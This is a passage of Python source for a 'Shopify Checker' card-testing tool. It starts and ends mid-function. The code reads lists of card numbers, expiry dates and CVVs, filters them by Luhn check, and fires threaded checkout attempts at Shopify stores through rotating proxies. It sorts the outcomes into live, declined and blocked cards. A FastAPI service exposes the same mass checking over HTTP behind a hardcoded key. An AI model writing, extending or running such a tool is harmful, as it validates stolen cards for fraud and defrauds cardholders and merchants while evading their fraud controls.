    eyelifter_write_hit(r)
    eyelifter_flush_writes()


def eyelifter_extract_sites_from_pipe(content):
    seen = set()
    out = []
    result_lines = 0
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "|" not in line:
            continue
        parts = [p.strip() for p in line.split("|")]
        if len(parts) < 5:
            continue
        head = parts[0]
        if len(head) < 13 or not head[:1].isdigit():
            continue
        cand = parts[4]
        if not cand or "." not in cand or " " in cand:
            continue
        result_lines += 1
        n = eyelifter_normalize_url(cand)
        if n and n not in seen:
            seen.add(n)
            out.append(n)
    if result_lines >= 2 and out:
        return out
    return None


def eyelifter_load_sites_file(path):
    if not path or not os.path.isfile(path):
        return None

    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        eyelifter_log("✗", "ERROR", "FILE", f"{e}")
        return None

    piped = eyelifter_extract_sites_from_pipe(content)
    if piped:
        eyelifter_dbg("SITES", f"pipe-parse: {len(piped)} unique sites")
        return piped
    raw_urls = []
    stripped = content.strip()

    if stripped.startswith(("[", "{")):
        try:
            parsed = json.loads(stripped)
            if isinstance(parsed, list):
                for item in parsed:
                    if isinstance(item, dict) and item.get("url"):
                        raw_urls.append(item["url"])
                    elif isinstance(item, str):
                        raw_urls.append(item)
            elif isinstance(parsed, dict) and parsed.get("url"):
                raw_urls.append(parsed["url"])
        except Exception:
            raw_urls = []

    if not raw_urls:
        for tok in eyelifter_extract_domain_tokens(content):
            raw_urls.append(tok)

    seen = set()
    urls = []
    for u in raw_urls:
        n = eyelifter_normalize_url(u)
        if n and n not in seen:
            seen.add(n)
            urls.append(n)

    return urls if urls else None

def eyelifter_load_cards_file(path):
    if not path or not os.path.isfile(path):
        return None

    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception:
        return None

    seen = set()
    valid = []
    invalid_luhn = []
    invalid_format = []

    for m in eyelifter_CARD_RE.finditer(content):
        number = m.group(1)
        month_raw = int(m.group(2))
        year_raw = int(m.group(3))
        cvv = m.group(4)

        key = (number, month_raw, year_raw, cvv)
        if key in seen:
            continue
        seen.add(key)

        matched = f"{number}|{month_raw:02d}|{year_raw}|{cvv}"

        if not (1 <= month_raw <= 12):
            invalid_format.append(matched)
            continue

        year = year_raw
        if year < 100:
            year += 2000
        elif year < 1000:
            invalid_format.append(matched)
            continue

        if not eyelifter_luhn_check(number):
            invalid_luhn.append(matched)
            continue

        valid.append(f"{number}|{month_raw:02d}|{year}|{cvv}")

    return valid, invalid_luhn, invalid_format

def eyelifter_mass_cards_run(proxies):
    global eyelifter_TOTAL
    eyelifter_section("MASS CARDS")

    print("[1] Single site")
    print("[2] Mass sites file")
    print("[0] Back")

    mode = input(f"{eyelifter_c('96', '[*] select > ')}").strip()
    if not mode or mode == "0":
        return

    if mode == "1":
        default = eyelifter_CFG.s.get("default_site", "").strip()
        hint = f" ({default})" if default else ""
        raw = input(f"{eyelifter_c('96', f'[*] site URL{hint} > ')}").strip()
        site = eyelifter_normalize_url(raw) if raw else eyelifter_normalize_url(default)
        if not site:
            return
        sites = [site]
    elif mode == "2":
        path = input(f"{eyelifter_c('96', '[*] sites file (JSON or 1-per-line) > ')}").strip()
        if not path or not os.path.isfile(path):
            eyelifter_log("✗", "ERROR", "FILE", "not found")
            return
        sites = eyelifter_load_sites_file(path)
        if not sites:
            eyelifter_log("✗", "ERROR", "INPUT", "no valid sites")
            return
        eyelifter_log("✓", "INFO", "INPUT", f"{len(sites)} unique sites")
    else:
        return

    path = input(f"{eyelifter_c('96', '[*] cards file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found")
        return

    res = eyelifter_load_cards_file(path)
    if not res:
        eyelifter_log("✗", "ERROR", "FILE", "not found")
        return

    cards, invalid_luhn, invalid_format = res
    total_input = len(cards) + len(invalid_luhn) + len(invalid_format)
    eyelifter_log("📥", "INFO", "INPUT", f"{total_input} lines read from {os.path.basename(path)}")

    if invalid_format:
        eyelifter_log("⚠️", "WARN", "LUHN", f"{len(invalid_format)} dropped — bad format (<4 fields or non-numeric)")
        for sample in invalid_format[:2]:
            eyelifter_log("⚠️", "WARN", "LUHN", f"  e.g. {sample[:30]}…")

    if invalid_luhn:
        eyelifter_log("⚠️", "WARN", "LUHN", f"{len(invalid_luhn)} dropped — failed Luhn check")
        for sample in invalid_luhn[:2]:
            try:
                p = eyelifter_parse_card(sample)
                masked = f"{p['number'][:6]}...{p['number'][-4:]}"
            except Exception:
                masked = sample[:20]
            eyelifter_log("⚠️", "WARN", "LUHN", f"  e.g. {masked}")

    if not cards:
        eyelifter_log("✗", "ERROR", "INPUT", f"0 cards passed Luhn — {len(invalid_luhn) + len(invalid_format)} rejected")
        return

    eyelifter_log("✅", "INFO", "LUHN", f"{len(cards)}/{total_input} cards passed Luhn")

    threads = eyelifter_ask_int("threads", eyelifter_CFG.s.get("threads", 8), 1, eyelifter_MAX_THREADS)
    eyelifter_CFG.s["threads"] = threads
    eyelifter_CFG.eyelifter_save()

    if proxies and not eyelifter_PROXY_POOL:
        eyelifter_PROXY_POOL.extend(proxies)

    if not eyelifter_PROXY_POOL:
        eyelifter_log("⚠️", "WARN", "DIRECT", f"no proxies → running direct at {threads} threads")

    d = eyelifter_ensure_folder()
    eyelifter_reset_stats()

    jobs = []
    for i, card in enumerate(cards):
        jobs.append((sites[i % len(sites)], card))

    eyelifter_TOTAL = len(jobs)
    country = eyelifter_CFG.s.get("country", "").strip() or None
    min_price = eyelifter_CFG.s.get("min_price", 0.10)
    max_price = eyelifter_CFG.s.get("max_price", 100.0)

    site_counts = {}
    for s, _ in jobs:
        site_counts[s] = site_counts.get(s, 0) + 1

    rr_label = "round-robin" if len(sites) > 1 else "single site"
    eyelifter_log(
        "🚀",
        "INFO",
        "START",
        f"{eyelifter_TOTAL} checks · {len(sites)} sites · {len(cards)} cards · {threads} threads · {rr_label}",
    )

    if len(sites) > 1:
        sample = sorted(site_counts.items(), key=lambda x: -x[1])[:3]
        eye_div = ", ".join(f"{eyelifter_normalize_url(s).split('//')[-1][:24]}={n}" for s, n in sample)
        eyelifter_log("📊", "INFO", "DIST", f"per-site: {eye_div}")
        if len(sites) > 3:
            avg = eyelifter_TOTAL / len(sites)
            eyelifter_log("📊", "INFO", "DIST", f"... {len(sites) - 3} more · avg {avg:.0f}/site")

    oo_lock = threading.Lock()
    progress = [0]
    progress_lock = threading.Lock()    
    out_of_range = set()

    def eyelifter_job_worker(site, card):
        if eyelifter_STOP.is_set():
            return
        delay = eyelifter_CFG.s.get("combo_delay", 0.3)
        if delay > 0 and eyelifter_STOP.wait(delay * (0.5 + random.random())):
            return
        eyelifter_rl_wait()
        if eyelifter_STOP.is_set():
            return

        r = eyelifter_check_site_retry(
            site, card,
            min_price=min_price,
            max_price=max_price,
            fixed_country=country,
        )

        if eyelifter_STOP.is_set():
            return
        _SITE_FAIL = (
            "OUT_OF_RANGE",
            "CHECKOUT_LOAD_FAILED",
            "no products from any",
            "No products from any",
            "NO_PRODUCTS_IN_PRICE_RANGE",
            "ALL_COUNTRIES_EXHAUSTED",
        )
        if any(x in (r.get("code") or "") for x in _SITE_FAIL) and len(sites) > 1:
            with oo_lock:
                out_of_range.add(site)
                available = [s for s in sites if s not in out_of_range]

            for alt in available[:3]:
                if eyelifter_STOP.is_set():
                    break
                r2 = eyelifter_check_site_retry(
                    alt, card,
                    min_price=min_price,
                    max_price=max_price,
                    fixed_country=country,
                    max_retries=1,
                )
                if not any(x in (r2.get("code") or "") for x in _SITE_FAIL):
                    r = r2
                    break
                with oo_lock:
                    out_of_range.add(alt)
        with progress_lock:
            progress[0] += 1
            done = progress[0]

        eyelifter_rline(done, eyelifter_TOTAL, r["verdict"], eyelifter_short_line(r))
        eyelifter_write_hit(r)

    ex = ThreadPoolExecutor(max_workers=threads)
    inflight = set()
    cap = max(threads * 4, 200)

    try:
        for i in range(0, len(jobs), cap):
            if eyelifter_STOP.is_set():
                break
            for job in jobs[i:i + cap]:
                if eyelifter_STOP.is_set():
                    break
                inflight.add(ex.submit(eyelifter_job_worker, job[0], job[1]))

            while len(inflight) >= cap:
                done, inflight = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass

        while inflight:
            done, inflight = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass

    except KeyboardInterrupt:
        eyelifter_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    finally:
        for f in inflight:
            f.cancel()
        _drain_end = time.monotonic() + 5.0
        while inflight and time.monotonic() < _drain_end:
            done, inflight = wait(inflight, timeout=0.5, return_when=FIRST_COMPLETED)
            for f in done:
                if f.cancelled():
                    continue
                try:
                    f.result(timeout=0.01)
                except BaseException:
                    pass
        ex.shutdown(wait=False, cancel_futures=True)

    eyelifter_flush_writes()
    counts = eyelifter_rename_by_count(d)
    eyelifter_log_counts(counts)
    eyelifter_final_summary(d)


def eyelifter_ask_int(label, default, lo, hi):
    raw = input(f"{eyelifter_c('96', f'[*] {label} ({default}) > ')}").strip()
    if not raw:
        return default
    try:
        v = int(raw)
        return max(lo, min(hi, v))
    except ValueError:
        return default


def eyelifter_final_summary(folder):
    el = time.time() - eyelifter_START_TIME
    with eyelifter_LK:
        snap = dict(eyelifter_ST)

    eyelifter_summary([
        ("Jobs", eyelifter_TOTAL),
        ("Checks", snap["checked"]),
        ("COMPLETED", snap["COMPLETED"]),
        ("3DS", snap["3DS"]),
        ("Approved (Insufficient Funds)", snap.get("Approved (Insufficient Funds)", 0)),
        ("Approved (CVC)", snap.get("Approved (CVC)", 0)),
        ("Approved (AVS)", snap.get("Approved (AVS)", 0)),
        ("DECLINED", snap["DECLINED"]),
        ("DEAD_CARD", snap["DEAD_CARD"]),
        ("CAPTCHA", snap["CAPTCHA"]),
        ("CAPTCHA_PROPOSAL", snap["CAPTCHA_PROPOSAL"]),
        ("RISK_BLOCKED", snap["RISK_BLOCKED"]),
        ("FAILED", snap["FAILED"]),
        ("CANCELLED", snap["CANCELLED"]),
        ("EXPIRED", snap["EXPIRED"]),
        ("TIMEOUT", snap["TIMEOUT"]),
        ("LOGIN_REQUIRED", snap["LOGIN_REQUIRED"]),
        ("OUT_OF_RANGE", snap.get("OUT_OF_RANGE", 0)),
        ("ERROR", snap["ERROR"]),
        ("Proxy fails", snap["pfails"]),
        ("Rate limited", snap["rate_limit"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{snap['checked'] / max(el, 0.001):.2f}/s"),
        ("Folder", folder),
        ("Credit", eyelifter_LINE_TAG),
    ])


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS")
    s = eyelifter_CFG.s

    print(f"  [1]  Threads:            {s['threads']} (1-{eyelifter_MAX_THREADS})")
    print(f"  [2]  Timeout:            {s['timeout']}s")
    print(f"  [3]  Combo Delay:        {s['combo_delay']}s")
    print(f"  [4]  Proxies File:       {s['proxies_file']}")
    print(f"  [5]  Skip Proxy Test:    {s['skip_proxy_test']}")
    print(f"  [6]  Debug:              {s['debug']}")
    print(f"  [7]  Default Card:       {s['card'] or '(unset)'}")
    print(f"  [8]  Default Country:    {s['country'] or '(auto)'}")
    print(f"  [9]  Global Min/Max Price")
    print(f"  [10] Warmup Site:        {s['warmup_site'] or '(disabled)'}")
    print(f"  [11] Re-run QID Warmup")
    print(f"  [12] Proxy Mode:         {'round-robin' if s.get('proxy_rr') else 'random'}")
    print(f"  [13] Check Retries:      {s.get('check_retries', 2)}")
    print(f"  [14] Default Card Site:  {s.get('default_site') or '(unset)'}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_c('96', '[*] select > ')}").strip()
    changed = False

    try:
        if ch == "1":
            s["threads"] = max(1, min(eyelifter_MAX_THREADS, int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["combo_delay"] = max(0.0, min(60.0, float(input("combo delay: "))))
            changed = True
        elif ch == "4":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "5":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "6":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "7":
            v = input("default card (blank to clear): ").strip()
            if v:
                try:
                    eyelifter_parse_card(v)
                    s["card"] = v
                    changed = True
                except Exception as e:
                    eyelifter_log("✗", "ERROR", "CARD", f"{e}")
            else:
                s["card"] = ""
                changed = True
        elif ch == "8":
            s["country"] = input("default country (blank=auto): ").strip().upper()
            changed = True
        elif ch == "9":
            try:
                mn = float(input(f"min price ({s['min_price']}): ").strip() or s["min_price"])
                mx = float(input(f"max price ({s['max_price']}): ").strip() or s["max_price"])
                if mn > mx:
                    eyelifter_log("✗", "ERROR", "CONFIG", "min > max")
                else:
                    s["min_price"] = mn
                    s["max_price"] = mx
                    changed = True
            except ValueError:
                eyelifter_log("✗", "ERROR", "CONFIG", "invalid number")
        elif ch == "10":
            s["warmup_site"] = input("warmup site (blank to disable): ").strip()
            changed = True
        elif ch == "11":
            if s["warmup_site"]:
                eyelifter_warmup_qids(s["warmup_site"])
            else:
                eyelifter_log("⚠️", "WARN", "WARMUP", "no warmup site configured")
        elif ch == "12":
            s["proxy_rr"] = not s.get("proxy_rr", False)
            changed = True
        elif ch == "13":
            try:
                s["check_retries"] = max(1, min(10, int(input("check retries: "))))
                changed = True
            except ValueError:
                pass
        elif ch == "14":
            v = input("default card site (blank to clear): ").strip()
            s["default_site"] = eyelifter_normalize_url(v) if v else ""
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            eyelifter_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception:
            pass


def eyelifter_load_proxy_pool(on_first=None):
    global eyelifter_PROXY_POOL
    proxy_file = os.path.join(
        os.path.dirname(eyelifter_CFG_PATH),
        eyelifter_CFG.s.get("proxies_file", "proxies.txt"),
    )
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not eyelifter_CFG.s.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies, on_first_good=on_first)
    eyelifter_PROXY_POOL = list(proxies)
    return proxies


def eyelifter_main():
    eyelifter_banner(eyelifter_TOOL, "Shopify Checker")

    card_line = eyelifter_CFG.s.get("card", "")
    card_display = f"{card_line[:6]}...{card_line[-4:]}" if card_line else "(unset)"

    eyelifter_log("🧬", "INFO", "TLS", f"curl_cffi={'on' if eyelifter_HAVE_CFFI else 'off'}")
    eyelifter_log("📣", "INFO", "CREDIT", eyelifter_LINE_TAG)
    eyelifter_log("🐛", "INFO", "DEBUG", f"{'ON' if eyelifter_CFG.s.get('debug') else 'OFF'}")
    eyelifter_log("⚙️", "INFO", "THREADS", f"max={eyelifter_MAX_THREADS} default={eyelifter_CFG.s['threads']}")
    eyelifter_log("💳", "INFO", "CARD", card_display)

    try:
        _mp = eyelifter_CFG.s["min_price"]
        _mx = eyelifter_CFG.s["max_price"]

        min_p = input(f"{eyelifter_c('96', f'[*] global min price ({_mp}) > ')}").strip()
        if min_p:
            eyelifter_CFG.s["min_price"] = float(min_p)

        max_p = input(f"{eyelifter_c('96', f'[*] global max price ({_mx}) > ')}").strip()
        if max_p:
            eyelifter_CFG.s["max_price"] = float(max_p)

        if eyelifter_CFG.s["min_price"] > eyelifter_CFG.s["max_price"]:
            eyelifter_log("⚠️", "WARN", "CONFIG", "min price > max price, swapping")
            eyelifter_CFG.s["min_price"], eyelifter_CFG.s["max_price"] = \
                eyelifter_CFG.s["max_price"], eyelifter_CFG.s["min_price"]

        eyelifter_CFG.eyelifter_save()
    except ValueError:
        eyelifter_log("⚠️", "WARN", "CONFIG", "invalid price, using saved defaults")

    warmup_site = eyelifter_CFG.s.get("warmup_site", "").strip()
    do_scrape = False
    if warmup_site:
        _ans = input(
            f"{eyelifter_c('96', f'[*] scrape fresh QIDs from {warmup_site}? [y/N] > ')}"
        ).strip().lower()
        do_scrape = _ans == "y"

    _proxy_box = [None]
    _first_proxy = [None]
    _first_event = threading.Event()

    def _on_first(p):
        _first_proxy[0] = p
        _first_event.set()

    def _bg_proxy_test():
        try:
            _proxy_box[0] = eyelifter_load_proxy_pool(on_first=_on_first)
        except Exception as e:
            eyelifter_log("✗", "ERROR", "PROXY", f"test crashed: {e}")

    _pt = threading.Thread(target=_bg_proxy_test, daemon=True)
    _pt.start()

    if do_scrape and warmup_site:
        use_proxy = None
        if eyelifter_CFG.s.get("skip_proxy_test", False):
            _fpath = os.path.join(
                os.path.dirname(eyelifter_CFG_PATH),
                eyelifter_CFG.s.get("proxies_file", "proxies.txt"),
            )
            _lst = eyelifter_load_proxies(_fpath)
            if _lst:
                use_proxy = _lst[0]
        else:
            if _first_event.wait(timeout=12):
                use_proxy = _first_proxy[0]

        if use_proxy:
            eyelifter_log("🌐", "INFO", "WARMUP", f"using proxy {use_proxy}")
        else:
            eyelifter_log("⚠️", "WARN", "WARMUP", "no working proxy yet — running direct")

        try:
            eyelifter_warmup_qids(warmup_site, use_proxy)
        except Exception as e:
            eyelifter_log("⚠️", "WARN", "WARMUP", f"scrape crashed: {e}")
    elif warmup_site:
        eyelifter_log("⏭️", "INFO", "WARMUP", "skipped — using cached/hardcoded QIDs")
    else:
        eyelifter_log("⚠️", "WARN", "WARMUP", "no warmup site — using hardcoded QIDs (set Settings [10])")

    _pt.join()
    proxies = _proxy_box[0] or []

    if proxies:
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} live")
    else:
        eyelifter_log("⚠️", "WARN", "PROXY", "direct")

    while True:
        eyelifter_section(f"MAIN MENU · {eyelifter_TG_USER} · {eyelifter_TG_CHAN}")

        if eyelifter_PROXY_POOL:
            eyelifter_log("🌐", "INFO", "PROXY", f"{len(eyelifter_PROXY_POOL)} proxies")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "direct")

        card_line = eyelifter_CFG.s.get("card", "")
        card_display = f"{card_line[:6]}...{card_line[-4:]}" if card_line else "(unset)"

        eyelifter_log("💳", "INFO", "CARD", card_display)
        eyelifter_log(
            "🔥",
            "INFO",
            "QID",
            f"warmed={'yes' if eyelifter_QIDS_WARMED else 'no'} · "
            f"cache={len(eyelifter_QIDS_CACHE)} builds",
        )

        print("[1] Card Checker")
        print("[2] Sites Checker")
        print("[3] Settings")
        print("[4] Exit")

        ch = input(f"{eyelifter_c('93', '[*] select > ')}").strip()

        if ch == "1":
            eyelifter_section("CARD CHECKER")
            print("[1] Single card")
            print("[2] Mass cards")
            print("[0] Back")

            sub = input(f"{eyelifter_c('96', '[*] select > ')}").strip()

            if sub == "1":
                eyelifter_single_card_run(proxies)
            elif sub == "2":
                eyelifter_STOP.clear()
                eyelifter_mass_cards_run(proxies)

        elif ch == "2":
            eyelifter_section("SITES CHECKER")
            print("[1] Single site (card check)")
            print("[2] Mass sites (alive only — fake cards)")
            print("[0] Back")

            sub = input(f"{eyelifter_c('96', '[*] select > ')}").strip()

            if sub == "1":
                eyelifter_single_site_run(proxies)
            elif sub == "2":
                eyelifter_STOP.clear()
                eyelifter_mass_sites_alive_run(proxies)

        elif ch == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxy_pool()

        elif ch == "4":
            print("Exiting...")
            return

        else:
            eyelifter_log("✗", "ERROR", "INPUT", "invalid")


# ═══════════════════════════════════════════════════════════
# FASTAPI HTTP BRIDGE
# ═══════════════════════════════════════════════════════════
# All engine symbols used below (eyelifter_check_site,
# eyelifter_warmup_qids, eyelifter_classify_proxy_error_local,
# eyelifter_QIDS_WARMED, eyelifter_DEFAULT_WARMUP_SITE) are
# defined ABOVE this point.
#
#   uvicorn api:app --host 0.0.0.0 --port 8000 --workers 1
#
# (uvicorn imports this file as module "api" → the __main__ block
#  further down is skipped, so CLI mode never fires.)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import asyncio as _asyncio
import threading as _threading
import time as _time
import urllib.parse as _urlparse
import logging as _logging
import re as _re
from concurrent.futures import ThreadPoolExecutor as _ThreadPoolExecutor
from contextlib import asynccontextmanager as _asynccontextmanager

from fastapi import FastAPI as _FastAPI, Query as _Query
from fastapi.responses import JSONResponse as _JSONResponse

_log = _logging.getLogger("api")

API_KEY       = os.environ.get("MSH_API_KEY", "oozaruhshop").strip()
WARMUP_SITE   = os.environ.get("WARMUP_SITE", eyelifter_DEFAULT_WARMUP_SITE).strip()
CHECK_WORKERS = int(os.environ.get("CHECK_WORKERS", "200"))
QID_REFRESH   = int(os.environ.get("QID_REFRESH_SEC", "1800"))
REQ_TIMEOUT   = int(os.environ.get("REQ_TIMEOUT_SEC", "90"))

# Fix H: queue depth guard so upstreams get 503 when we're saturated.
MAX_INFLIGHT  = int(os.environ.get("MAX_INFLIGHT", str(CHECK_WORKERS + CHECK_WORKERS // 2)))
_INFLIGHT     = 0
_INFLIGHT_LOCK = _threading.Lock()

EXEC = _ThreadPoolExecutor(max_workers=CHECK_WORKERS, thread_name_prefix="shopchk")

_PROXY_DEAD_COUNT = 0
_PROXY_LIVE_COUNT = 0
_STATS_LOCK = _threading.Lock()


# ── Fix G: proxy URL sanitiser (adds socks5h:// / socks4a://) ─────────
def _sanitize_proxy_url(url: str) -> str:
    if not url:
        return ""
    url = url.strip()
    if not url:
        return ""
    if any(c in url for c in (" ", "\n", "\r", "\t")):
        return ""

    scheme = "http"
    for s in ("socks5h://", "socks5://", "socks4a://", "socks4://", "https://", "http://"):
        if url.lower().startswith(s):
            scheme = s[:-3]
            url = url[len(s):]
            break

    if "@" in url:
        userinfo, hostport = url.rsplit("@", 1)
        if ":" in userinfo:
            user, pwd = userinfo.split(":", 1)
        else:
            user, pwd = userinfo, ""
        try:
            user = _urlparse.unquote(user)
            pwd  = _urlparse.unquote(pwd)
        except Exception:
            pass
        user = _urlparse.quote(user, safe="")
        pwd  = _urlparse.quote(pwd, safe="")
        netloc = f"{user}:{pwd}@{hostport}" if pwd else f"{user}@{hostport}"
    else:
        netloc = url

    host = netloc.rsplit("@", 1)[-1]
    if ":" not in host:
        return ""
    host_part, port_part = host.rsplit(":", 1)
    if not host_part or not port_part.isdigit():
        return ""

    return f"{scheme}://{netloc}"


# ── Fix J: parse [INFO]/[WARNING]/[ERROR] prefix from message field ───
_SEV_PREFIX = _re.compile(r'^\s*\[(DEBUG|INFO|WARNING|WARN|ERROR|CRITICAL)\]\s*', _re.IGNORECASE)
_SEV_MAP = {
    "DEBUG":    _logging.DEBUG,
    "INFO":     _logging.INFO,
    "WARNING":  _logging.WARNING,
    "WARN":     _logging.WARNING,
    "ERROR":    _logging.ERROR,
    "CRITICAL": _logging.CRITICAL,
}


def _log_level_from_response(text, status):
    """Return (level, cleaned_text). Prefers explicit prefix; falls back to status."""
    level = _logging.INFO if status else _logging.WARNING
    if isinstance(text, str):
        m = _SEV_PREFIX.match(text)
        if m:
            lvl = _SEV_MAP.get(m.group(1).upper())
            if lvl is not None:
                level = lvl
            text = text[m.end():]
    return level, text


def _map_verdict(result: dict) -> tuple:
    verdict = (result.get("verdict") or "ERROR").strip()
    code    = (result.get("code") or "").strip()
    code_up = code.upper()

    if verdict == "COMPLETED":
        return "ORDER_PLACED", True
    if verdict == "3DS":
        return "3DS_REQUIRED", True
    if verdict == "Approved (Insufficient Funds)":
        return "INSUFFICIENT_FUNDS", True
    if verdict == "Approved (CVC)":
        return "INVALID_CVC", True
    if verdict == "Approved (AVS)":
        return "INVALID_CVC", True

    if verdict == "DEAD_CARD":
        if code_up in ("INCORRECT_NUMBER", "INVALID_NUMBER",
                       "INVALID_CARD", "NUMBER_INVALID"):
            return "INCORRECT_NUMBER", True
        return code_up or "INCORRECT_NUMBER", True
    if verdict == "DECLINED":
        return code_up or "CARD_DECLINED", True
    if verdict == "EXPIRED":
        return "EXPIRED_CARD", True

    if verdict in ("CAPTCHA", "CAPTCHA_PROPOSAL"):
        return "CAPTCHA_REQUIRED", False
    if verdict == "RISK_BLOCKED":
        return "FRAUD_SUSPECTED", False
    if verdict == "LOGIN_REQUIRED":
        return "SITE_REQUIRES_LOGIN", False
    if verdict == "OUT_OF_RANGE":
        return "NO_PRODUCTS_IN_PRICE_RANGE", False
    if verdict == "TIMEOUT":
        return "TIMEOUT", False

    return code_up or "SITE_ERROR", False


def _proxy_is_dead(result: dict) -> bool:
    hint = eyelifter_classify_proxy_error_local(result) or ""
    if hint == "bad":
        return True
    if hint == "cool":
        return False

    verdict = (result.get("verdict") or "").upper()
    code_up = (result.get("code") or "").upper()

    if verdict == "TIMEOUT" and "POLL_TIMEOUT" in code_up:
        return False

    transport_markers = (
        "CONNECTIONERROR", "FAILED_TO_CONNECT", "PROXYERROR",
        "TIMEOUT", "CURLERROR", "DNSERROR", "SSLERROR",
        "CONNECTION_RESET", "OPERATION_TIMEDOUT",
    )
    return any(t in code_up for t in transport_markers)


def _run_sync(site: str, card: str, proxy: str) -> dict:
    global _PROXY_DEAD_COUNT, _PROXY_LIVE_COUNT

    try:
        result = eyelifter_check_site(site, card, proxy_url=proxy)
        if not isinstance(result, dict):
            raise TypeError(f"engine returned {type(result).__name__}")
    except Exception as e:
        _log.exception(f"checker crashed for {site} proxy={proxy[:24]}…")
        with _STATS_LOCK:
            _PROXY_DEAD_COUNT += 1
        return {
            "Gateway":  "Shopify Payments",
            "Price":    "0.00",
            "Proxy":    "Dead",
            "Response": f"API_ERROR: {type(e).__name__}: {str(e)[:80]}",
            "Status":   False,
        }

    dead = _proxy_is_dead(result)
    with _STATS_LOCK:
        if dead:
            _PROXY_DEAD_COUNT += 1
        else:
            _PROXY_LIVE_COUNT += 1

    resp, ok = _map_verdict(result)
    return {
        "Gateway":  result.get("gateway") or "Shopify Payments",
        "Price":    result.get("amount")  or "0.00",
        "Proxy":    "Dead" if dead else "Live",
        "Response": resp,
        "Status":   ok,
    }


# ── Fix I: pick a live proxy for warmup from PROXIES_FILE ─────────────
def _pick_warmup_proxy() -> str:
    try:
        prox_file = os.environ.get("PROXIES_FILE", "proxies.txt")
        if not os.path.isabs(prox_file):
            prox_file = os.path.join(os.path.dirname(eyelifter_CFG_PATH), prox_file)
        plist = eyelifter_load_proxies(prox_file)
        if not plist:
            return ""
        # Quick liveness probe of the first few; fall back to the first one
        for p in plist[:5]:
            try:
                if eyelifter_test_proxy(p):
                    return p
            except Exception:
                continue
        return plist[0]
    except Exception:
        return ""


_qid_task = None

async def _qid_refresh_loop() -> None:
    while True:
        try:
            await _asyncio.sleep(QID_REFRESH)
            _log.info(f"[QID] periodic refresh from {WARMUP_SITE}")
            warmup_proxy = _pick_warmup_proxy()
            if warmup_proxy:
                _log.info(f"[QID] refresh via proxy {warmup_proxy[:32]}…")
            ok = await _asyncio.to_thread(eyelifter_warmup_qids, WARMUP_SITE, warmup_proxy)
            _log.info(f"[QID] refresh {'ok' if ok else 'FAILED'}")
        except _asyncio.CancelledError:
            raise
        except Exception as e:
            _log.warning(f"[QID] periodic refresh crashed: {e}")


@_asynccontextmanager
async def lifespan(_app):
    # Fix A: no credit verification anymore.
    if not WARMUP_SITE:
        _log.warning(
            "[STARTUP] WARMUP_SITE is empty — hard-coded QIDs will be used "
            "and will rot after the next Shopify deploy."
        )
    else:
        try:
            warmup_proxy = _pick_warmup_proxy()
            if warmup_proxy:
                _log.info(f"[STARTUP] warmup using proxy {warmup_proxy[:32]}…")
            else:
                _log.info("[STARTUP] warmup running direct (no proxy found)")
            ok = await _asyncio.to_thread(eyelifter_warmup_qids, WARMUP_SITE, warmup_proxy)
            if ok:
                _log.info(f"[STARTUP] QID warmup ok from {WARMUP_SITE}")
            else:
                _log.warning("[STARTUP] QID warmup returned False — using cached/hard-coded QIDs")
        except Exception as e:
            _log.error(f"[STARTUP] QID warmup crashed: {e}")

    global _qid_task
    if QID_REFRESH > 0 and WARMUP_SITE:
        _qid_task = _asyncio.create_task(_qid_refresh_loop())

    yield

    if _qid_task:
        _qid_task.cancel()
        try:
            await _qid_task
        except (_asyncio.CancelledError, Exception):
            pass
    try:
        eyelifter_flush_writes()
    except Exception:
        pass
    EXEC.shutdown(wait=False, cancel_futures=True)


app = _FastAPI(title="Shopify Checker API", version="4.7.0", lifespan=lifespan)


@app.get("/health")
async def health():
    with _STATS_LOCK:
        dead = _PROXY_DEAD_COUNT
        live = _PROXY_LIVE_COUNT
    total = dead + live
    with _INFLIGHT_LOCK:
        inflight = _INFLIGHT
    return {
        "status":      "ok",
        "qids_warmed": bool(eyelifter_QIDS_WARMED),
        "warmup_site": WARMUP_SITE or None,
        "workers":     CHECK_WORKERS,
        "inflight":    inflight,
        "max_inflight": MAX_INFLIGHT,
        "proxy_stats": {
            "live_reports": live,
            "dead_reports": dead,
            "dead_pct":     round(100.0 * dead / total, 1) if total else 0.0,
        },
    }


@app.post("/warmup")
async def warmup(key: str = _Query(...)):
    if key != API_KEY:
        return _JSONResponse({"error": "unauthorized"}, status_code=401)
    if not WARMUP_SITE:
        return _JSONResponse({"ok": False, "error": "WARMUP_SITE unset"})
    warmup_proxy = _pick_warmup_proxy()
    ok = await _asyncio.to_thread(eyelifter_warmup_qids, WARMUP_SITE, warmup_proxy)
    return {"ok": ok, "warmup_site": WARMUP_SITE, "proxy_used": bool(warmup_proxy)}


@app.get("/shopify")
async def shopify(
    site:  str = _Query(...),
    cc:    str = _Query(...),
    key:   str = _Query(...),
    proxy: str = _Query(""),
):
    if key != API_KEY:
